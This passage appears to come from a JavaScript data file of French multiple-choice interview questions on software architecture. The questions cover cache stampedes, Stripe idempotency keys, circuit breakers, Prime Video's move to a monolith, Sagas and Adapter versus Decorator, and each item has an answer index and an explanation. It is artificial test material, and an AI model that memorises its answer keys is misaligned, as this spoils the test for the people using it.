    company: 'Redis',
    scenario:
      "Une clé Redis très demandée expire. Instantanément, des milliers de requêtes constatent le miss et frappent toutes la base pour recalculer la même valeur, qui s'effondre.",
    question: 'Quelle parade ?',
    options: [
      'Augmenter la RAM de Redis pour garder plus de clés',
      'Locking/coalescing + early expiration + jitter sur les TTL',
      'Supprimer le cache et taper directement la base',
      'Réduire le nombre de serveurs applicatifs frontaux',
    ],
    answer: 1,
    explanation:
      "Le **cache stampede** (thundering herd) : une clé populaire expire → ruée simultanée sur la base. Parades : (1) **locking / coalescing** — une seule requête recalcule, les autres attendent ; (2) **early expiration probabiliste** (XFetch) — recalcul anticipé avant le TTL ; (3) `stale-while-revalidate`. Et surtout un **jitter aléatoire sur les TTL** pour éviter que tout un lot de clés expire en même temps.",
    tags: ['web', 'cache', 'stampede', 'redis'],
  },

  // =================================================== ARCHITECTURE
  {
    id: 'rw-arch-stripe-idem',
    type: 'mcq',
    domain: 'software',
    topic: 'architecture',
    difficulty: 'senior',
    title: 'Clé d\'idempotence',
    company: 'Stripe',
    scenario:
      "Un client clique « Payer », le réseau timeout avant la réponse, il rejoue le `POST /v1/charges`. Sans protection, il est débité deux fois.",
    question: 'Comment Stripe garantit-il un seul débit ?',
    options: [
      'En augmentant le timeout pour laisser la 1re requête finir',
      'En-tête Idempotency-Key (UUID côté client) : la réponse est mémorisée et rejouée',
      'En bloquant tout retry côté serveur pendant 24 h',
      'En passant le POST /charges en requête GET',
    ],
    answer: 1,
    explanation:
      "Stripe accepte un en-tête **`Idempotency-Key`** (UUID) sur les POST. La première requête est traitée et sa **réponse mémorisée** (≥ 24 h) ; tout rejeu avec la même clé renvoie ce résultat, sans re-débiter. La clé doit être **générée au point d'origine (client)** : la générer côté serveur ferait qu'un retry crée une nouvelle clé et perde la déduplication. Stripe compare aussi les paramètres et rejette une clé réutilisée pour une requête différente.",
    tags: ['architecture', 'idempotence', 'stripe', 'api'],
  },
  {
    id: 'rw-arch-circuit-breaker',
    type: 'mcq',
    domain: 'software',
    topic: 'architecture',
    difficulty: 'senior',
    title: 'Circuit breaker',
    company: 'Netflix',
    scenario:
      "L'API gateway de Netflix appelle 50+ services. Quand l'un devient lent, les threads s'accumulent et saturent la gateway, propageant la panne à tout le système.",
    question: 'Comment le pattern circuit breaker aide-t-il ?',
    options: [
      'Il relance les appels échoués plus vite et plus souvent',
      'Il « ouvre » après trop d\'échecs : fast-fail + fallback (Closed/Open/Half-Open)',
      'Il ajoute automatiquement des serveurs au service lent',
      'Il ignore les erreurs et renvoie toujours un succès',
    ],
    answer: 1,
    explanation:
      "Le **circuit breaker** protège l'appelant d'un dépendant défaillant. **Closed** : les appels passent, on compte les échecs. **Open** : au-delà d'un seuil (Hystrix : > 50 % d'erreurs sur ≥ 20 requêtes / 10 s), on **fast-fail** avec un fallback, sans attendre — le service en panne peut souffler. **Half-Open** : quelques appels-test décident de refermer ou rouvrir. Indispensable : un **timeout** (sans lui, le breaker ne protège pas de la lenteur) et un fallback gracieux.",
    tags: ['architecture', 'résilience', 'circuit-breaker', 'netflix'],
  },
  {
    id: 'rw-arch-prime-monolith',
    type: 'mcq',
    domain: 'software',
    topic: 'architecture',
    difficulty: 'senior',
    title: 'Retour au monolithe ?',
    company: 'Amazon Prime Video',
    scenario:
      "En 2023, l'équipe de monitoring qualité audio/vidéo de Prime Video est passée de microservices (Step Functions + Lambda) à un monolithe, réduisant ses coûts de ~90 %.",
    question: 'Quelle leçon en tirer correctement ?',
    options: [
      'Les microservices sont morts, tout le monde revient au monolithe',
      'Cas contextuel : coûts d\'orchestration + transferts S3 ; ne visait qu\'un service',
      'Il ne faut jamais utiliser AWS Lambda en production',
      'S3 est trop cher et à éviter pour tout transfert de données',
    ],
    answer: 1,
    explanation:
      "Le piège est la **sur-généralisation**. Pour **ce service précis**, les coûts dominants étaient l'orchestration (facturée par transition) et les **transferts de données** inter-composants passant par S3 ; les rapprocher dans un même processus les a supprimés (~90 % d'économie). Ce n'était **pas** un abandon des microservices par Amazon, mais un choix contextuel. Inversement, découper trop tôt crée un « monolithe distribué » : couplage + latence réseau sans les bénéfices.",
    tags: ['architecture', 'microservices', 'monolithe', 'coûts'],
  },
  {
    id: 'rw-arch-saga',
    type: 'mcq',
    domain: 'software',
    topic: 'architecture',
    difficulty: 'senior',
    title: 'Transaction distribuée',
    company: 'microservices.io',
    scenario:
      "Une commande touche 4 services (Order, Payment, Inventory, Shipping), chacun avec sa propre base. Impossible d'avoir une transaction ACID globale. Le paiement réussit mais le stock est indisponible.",
    question: 'Quel pattern gère cette cohérence ?',
    options: [
      'Un gros verrou global sur les 4 bases pendant la commande',
      'Le pattern Saga : transactions locales + compensations idempotentes en cas d\'échec',
      'Ignorer l\'incohérence et corriger à la main plus tard',
      'Fusionner les 4 services dans une seule base partagée',
    ],
    answer: 1,
    explanation:
      "La **Saga** remplace la transaction ACID distribuée (2PC, peu scalable) par une **suite de transactions locales**. Si l'étape N échoue, on lance des **transactions de compensation** pour défaire les précédentes (rembourser le paiement, relâcher le stock). Attention : une saga n'a **pas d'isolation** (ACD, pas ACID) → gérer les lectures sales via semantic lock / versioning, et rendre les compensations **idempotentes et commutatives**. Publier l'événement atomiquement (transactional outbox).",
    tags: ['architecture', 'saga', 'transactions', 'microservices'],
  },

  // =================================================== DESIGN PATTERNS (compléments)
  {
    id: 'rw-pattern-adapter-decorator',
    type: 'mcq',
    domain: 'software',
    topic: 'design-patterns',
    difficulty: 'senior',
    title: 'Adapter ou Decorator ?',
    company: 'Java IO',
    scenario:
      "Dans la lib Java IO : `InputStreamReader` transforme un flux d'octets en flux de caractères ; `BufferedInputStream` ajoute un buffer sans changer l'interface. Deux patterns proches mais distincts.",
    question: 'Quelle est la différence Adapter vs Decorator ?',
    options: [
      'Ce sont deux noms différents pour exactement le même pattern',
      'Adapter change l\'interface vers celle attendue ; Decorator garde la même et l\'enrichit',
      'Adapter est simplement une version plus rapide du Decorator',
      'Le Decorator ne fonctionne qu\'en Java, l\'Adapter partout',
    ],
    answer: 1,
    explanation:
      "**Adapter** : convertit l'interface d'un objet vers une **autre** interface attendue par le client (`InputStreamReader` : octets → caractères), sans modifier l'objet d'origine. **Decorator** : implémente la **même** interface que l'objet enveloppé et lui délègue en **ajoutant** un comportement (`BufferedInputStream` reste un `InputStream`). Adapter = compatibilité ; Decorator = extension. L'ordre d'empilement des décorateurs compte (chiffrer-puis-compresser ≠ l'inverse).",
    tags: ['design-patterns', 'adapter', 'decorator', 'structurel'],
  },
];
